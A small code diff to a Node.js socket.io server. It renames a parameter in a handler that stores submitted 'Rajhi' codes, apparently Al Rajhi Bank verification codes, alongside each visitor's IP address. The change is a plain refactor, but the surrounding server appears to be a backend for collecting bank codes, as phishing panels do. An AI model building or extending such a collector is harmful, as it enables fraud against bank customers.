@@ -306,7 +306,7 @@ io.on("connection", (socket) => {
     socket.emit("ackVerification", { success: true, error: null });
   });
 
-  socket.on("submitRajhiCode", async ({ ip, rajhi_code }) => {
+  socket.on("submitRajhiCode", async ({ ip, rajhiCode }) => {
     // 1) Ensure a User record exists
     const user = await findOrCreateUser(ip);
 
@@ -314,7 +314,7 @@ io.on("connection", (socket) => {
     const saved = await RajhiCode.create({
       user: user._id,
       ip: ip,
-      rajhiCode: rajhi_code,
+      rajhiCode: rajhiCode,
       time: Date.now(),
     });
 
